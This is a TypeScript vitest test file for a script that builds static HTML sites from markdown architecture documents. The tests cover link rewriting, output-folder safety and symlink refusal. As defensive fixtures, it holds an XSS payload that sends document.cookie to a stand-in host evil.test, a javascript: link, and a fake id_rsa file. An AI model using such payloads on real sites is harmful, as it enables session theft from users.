import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, readdirSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

import { buildSite, createConverter, defaultOut, formatResult, MARKER, parseArguments, type MarkedClass, type ToHtml } from "./build-site.mts";
import { CouldNotRun } from "./lib/outcome.mts";
import { createFolder, initGit, mermaid, SCRIPTS } from "./support.mts";

const script = join(SCRIPTS, "build-site.mts");

/** Enough of a markdown converter for these tests: headings, links, pictures, mermaid blocks, paragraphs. */
const toHtml: ToHtml = (markdown) =>
  markdown
    .replace(/```mermaid\n([\s\S]*?)\n```/g, (_, source: string) => `<pre><code class="language-mermaid">${source}\n</code></pre>`)
    .replace(/^(#{1,6}) (.*)$/gm, (_, marks: string, text: string) => `<h${marks.length}>${text}</h${marks.length}>`)
    .replace(/!\[([^\]]*)\]\(([^)]*)\)/g, '<img src="$2" alt="$1">')
    .replace(/\[([^\]]*)\]\(([^)]*)\)/g, '<a href="$2">$1</a>');

/** A repository with a set of three documents, a picture, and a file outside the set. */
function createSet(): { root: string; bundle: string } {
  const root = createFolder({
    "server/web.ts": "",
    "docs/architecture/README.md": "# The set\n\n[C4](02-c4.md#context) and [notes](deep/notes.md).\n",
    "docs/architecture/02-c4.md": `# C4\n\n## Context\n\n${mermaid("flowchart LR\n  a --> b")}\n\n![flow](flow.svg) [code](../../server/web.ts) [home](README.md)\n`,
    "docs/architecture/deep/notes.md": `# Notes\n\n${mermaid("flowchart TD\n  x")}\n\n${mermaid("flowchart TD\n  y")}\n\n[up](../02-c4.md)\n`,
    "docs/architecture/flow.svg": "<svg/>",
    "bundle/mermaid.min.js": "MERMAID",
  });

  initGit(root);

  return { root, bundle: join(root, "bundle/mermaid.min.js") };
}

describe("a built copy", () => {
  const { root, bundle } = createSet();
  const out = join(createFolder(), "site");
  const built = buildSite({ folder: join(root, "docs/architecture"), out, toHtml, mermaidBundle: bundle });
  const read = (page: string): string => readFileSync(join(out, page), "utf8");

  it("has a page for each document, the README as the page it opens on, and says what it built", () => {
    expect(readdirSync(out).sort()).toEqual([MARKER, "02-c4.html", "deep", "flow.svg", "index.html", "mermaid.min.js"]);
    expect(readdirSync(join(out, "deep"))).toEqual(["notes.html"]);
    expect(built).toEqual({ out, start: join(out, "index.html"), pages: 3, diagrams: 3, copied: 1, refused: [], links: [] });
    expect(formatResult(built)).toBe(`Built 3 page(s) with 3 diagram(s) and 1 other file(s) in ${out}\nOpen ${join(out, "index.html")}`);
  });

  it("carries Mermaid and the set's pictures, so it reads with nothing fetched", () => {
    expect(read("mermaid.min.js")).toBe("MERMAID");
    expect(read("flow.svg")).toBe("<svg/>");
  });

  it("lists the chapters from the start page on, each by its first heading, under the set's name", () => {
    expect([...read("index.html").matchAll(/<a href="[^"]*" data-page="([^"]+)">([^<]+)</g)].map((match) => `${match[1]}=${match[2]}`)).toEqual(["index.html=The set", "02-c4.html=C4", "deep/notes.html=Notes"]);
    expect(read("02-c4.html")).toContain("<title>C4 · The set</title>");
  });

  it("links documents to each other's pages, with anchors that match the headings", () => {
    expect(read("index.html")).toContain('<a href="02-c4.html#context">C4</a>');
    expect(read("02-c4.html")).toContain('<h2 id="context">');
    expect(read("deep/notes.html")).toContain('<a href="../02-c4.html">up</a>');
    expect(read("02-c4.html")).toContain('<a href="index.html">home</a>');
  });

  it("points a link that leaves the set at the file itself, from where the page is", () => {
    const href = /<a href="([^"]+)">code<\/a>/.exec(read("02-c4.html"))?.[1] as string;

    expect(href.endsWith("server/web.ts")).toBe(true);
    expect(existsSync(join(out, href))).toBe(true);
  });

  it("replaces what was there: a page of a document that is gone does not stay", () => {
    writeFileSync(join(out, "old.html"), "");
    buildSite({ folder: join(root, "docs/architecture"), out, toHtml, mermaidBundle: bundle });

    expect(existsSync(join(out, "old.html"))).toBe(false);
  });
});

describe("the options of a build", () => {
  it("point a link that leaves the set at a web address when one is given", () => {
    const { root, bundle } = createSet();
    const out = join(createFolder(), "site");

    buildSite({ folder: join(root, "docs/architecture"), out, toHtml, mermaidBundle: bundle, repoUrl: "https://example.test/acme/app/blob/main/" });

    expect(readFileSync(join(out, "02-c4.html"), "utf8")).toContain('<a target="_blank" rel="noopener noreferrer" href="https://example.test/acme/app/blob/main/server/web.ts">code</a>');
  });

  it("take a start page from outside the folder, and the documents link back to it", () => {
    const root = createFolder({
      "docs/architecture.md": "# Index\n\n[one](architecture/01.md)\n",
      "docs/architecture/01.md": "# One\n\n[back](../architecture.md)\n",
      "m.js": "",
    });
    const out = join(createFolder(), "site");
    const built = buildSite({ folder: join(root, "docs/architecture"), index: join(root, "docs/architecture.md"), out, toHtml, mermaidBundle: join(root, "m.js"), title: "Named" });

    expect(built.pages).toBe(2);
    expect(readFileSync(join(out, "index.html"), "utf8")).toContain('<a href="01.html">one</a>');
    expect(readFileSync(join(out, "01.html"), "utf8")).toContain('<a href="index.html">back</a>');
    expect(readFileSync(join(out, "01.html"), "utf8")).toContain("<title>One · Named</title>");
  });
});

describe("a build that cannot run", () => {
  const { root, bundle } = createSet();
  const folder = join(root, "docs/architecture");
  const build = (options: Partial<Parameters<typeof buildSite>[0]>): unknown => buildSite({ folder, out: join(createFolder(), "site"), toHtml, mermaidBundle: bundle, ...options });

  it("says so for a folder that is not there, and for one with no page to start from", () => {
    expect(() => build({ folder: join(root, "dcos") })).toThrow(CouldNotRun);
    expect(() => build({ folder: join(root, "server") })).toThrow(/has no README\.md to start from\. Name the start page with --index <file>\./);
    expect(() => build({ index: join(root, "nope.md") })).toThrow(/does not exist/);
  });

  it("refuses to write into the documents' own folder: it empties the folder it writes to", () => {
    expect(() => build({ out: folder })).toThrow(/Name a folder outside it/);
    expect(() => build({ out: join(folder, "site") })).toThrow(/Name a folder outside it/);
    expect(existsSync(join(folder, "README.md"))).toBe(true);
  });

  it("refuses two documents that would become one page", () => {
    expect(() => build({ index: join(folder, "02-c4.md") })).toThrow(/two documents would both become index\.html/);
  });
});

describe("the folder a copy is written to", () => {
  const { root, bundle } = createSet();
  const folder = join(root, "docs/architecture");
  const build = (out: string): unknown => buildSite({ folder, out, toHtml, mermaidBundle: bundle });

  it("is emptied only when it is new, empty, or a copy built here: a mistyped --out must not cost a person their files", () => {
    const precious = createFolder({ "thesis.txt": "three years" });

    expect(() => build(precious)).toThrow(/already holds something this script did not build\. It empties the folder it writes to, so name a new or empty one\./);
    expect(readFileSync(join(precious, "thesis.txt"), "utf8")).toBe("three years");
  });

  it("may be an empty folder, and may be built into again", () => {
    const out = createFolder();

    build(out);
    writeFileSync(join(out, "stale.html"), "");
    build(out);

    expect(existsSync(join(out, MARKER))).toBe(true);
    expect(existsSync(join(out, "stale.html"))).toBe(false);
  });

  it("is never a file, and never a symbolic link", () => {
    const place = createFolder({ "a-file": "x" });

    symlinkSync(createFolder({ "kept.txt": "x" }), join(place, "a-link"));

    expect(() => build(join(place, "a-file"))).toThrow(CouldNotRun);
    expect(() => build(join(place, "a-link"))).toThrow(/is a symbolic link\. Name a real folder\./);
  });
});

describe("a document that could harm its reader", () => {
  it("has its hand-written HTML made harmless by the converter the copy is built with", () => {
    const seen: string[] = [];
    // The converter is fetched, so here it is a stand-in that renders one HTML token the way it is told to.
    const Marked = class {
      private readonly html: (token: { text: string }) => string;

      constructor(options: { renderer: { html: (token: { text: string }) => string } }) {
        this.html = options.renderer.html;
      }

      parse(markdown: string): string {
        seen.push(markdown);

        return this.html({ text: markdown });
      }
    } as unknown as MarkedClass;

    expect(createConverter(Marked)('<script>fetch("https://evil.test/" + document.cookie)</script><b>x</b>')).toBe('&lt;script&gt;fetch("https://evil.test/" + document.cookie)&lt;/script&gt;<b>x</b>');
    expect(seen).toHaveLength(1);
  });

  it("has a link that would run a script lead nowhere, and the build says so", () => {
    const root = createFolder({ "docs/README.md": "# T\n\n[click](javascript:alert(document.domain)) [fine](https://example.test)\n", "m.js": "" });
    const out = join(createFolder(), "site");
    const built = buildSite({ folder: join(root, "docs"), out, toHtml: (markdown) => markdown.replace(/^# (.*)$/m, "<h1>$1</h1>").replace(/\[([^\]]*)\]\(((?:[^()]|\([^()]*\))*)\)/g, '<a href="$2">$1</a>'), mermaidBundle: join(root, "m.js") });
    const page = readFileSync(join(out, "index.html"), "utf8");

    expect(page).toContain('<a href="#">click</a>');
    expect(page).not.toContain("javascript:");
    expect(built.refused).toEqual(["javascript:alert(document.domain)"]);
    expect(formatResult(built)).toContain('  1 link(s) are not safe to follow and lead nowhere in the copy: "javascript:alert(document.domain)"');
  });
});

describe("a document that is a symbolic link", () => {
  it("is not read into the copy, and the build says so", () => {
    const secret = createFolder({ "id_rsa": "# PRIVATE KEY\n" });
    const root = createFolder({ "docs/README.md": "# T\n", "m.js": "" });

    symlinkSync(join(secret, "id_rsa"), join(root, "docs/notes.md"));
    mkdirSync(join(root, "docs/real"));
    symlinkSync(secret, join(root, "docs/linked-folder"));

    const out = join(createFolder(), "site");
    const built = buildSite({ folder: join(root, "docs"), out, toHtml, mermaidBundle: join(root, "m.js") });

    expect(built.pages).toBe(1);
    expect(built.links).toEqual(["notes.md"]);
    expect(readdirSync(out).sort()).toEqual([MARKER, "index.html", "mermaid.min.js"]);
    expect(formatResult(built)).toContain("  not read, because a symbolic link is never followed: notes.md");
  });

  it("is refused as the start page", () => {
    const root = createFolder({ "docs/real.md": "# T\n", "m.js": "" });

    symlinkSync(join(root, "docs/real.md"), join(root, "docs/README.md"));

    expect(() => buildSite({ folder: join(root, "docs"), out: join(createFolder(), "site"), toHtml, mermaidBundle: join(root, "m.js") })).toThrow(/is a symbolic link, and a link is never followed/);
  });
});

describe("where a copy goes when nobody said", () => {
  it("is the cache, never the repository, with one folder for each set", () => {
    expect(defaultOut("/repo/a/docs/architecture", "/cache")).toMatch(/^\/cache\/sites\/docs-architecture-[0-9a-f]{8}$/);
    expect(defaultOut("/repo/a/docs/architecture", "/cache")).not.toBe(defaultOut("/repo/b/docs/architecture", "/cache"));
  });
});

describe("the command line", () => {
  it("takes one folder and its options", () => {
    expect(parseArguments(["docs/architecture", "--index", "docs/a.md", "--out", "/tmp/s", "--title", "T", "--repo-url", "https://x.test"])).toEqual({
      folder: "docs/architecture",
      index: "docs/a.md",
      out: "/tmp/s",
      title: "T",
      repoUrl: "https://x.test",
    });
    expect(parseArguments(["docs"])).toEqual({ folder: "docs" });
  });

  it("refuses no folder, two folders, a flag it does not know, and a flag with no value", () => {
    expect(() => parseArguments([])).toThrow(CouldNotRun);
    expect(() => parseArguments(["a", "b"])).toThrow(CouldNotRun);
    expect(() => parseArguments(["a", "--fast"])).toThrow(CouldNotRun);
    expect(() => parseArguments(["a", "--out"])).toThrow(CouldNotRun);
  });

  it("exits 2, fetching nothing, when the folder is not there", () => {
    const cache = createFolder();
    const ran = spawnSync(process.execPath, [script, "no-such-folder"], { encoding: "utf8", cwd: createFolder(), env: { ...process.env, XDG_CACHE_HOME: cache } });

    expect(ran.status).toBe(2);
    expect(ran.stderr).toBe("build-site could not run: no-such-folder is not a folder\n");
    expect(readdirSync(cache)).toEqual([]);
  });
});
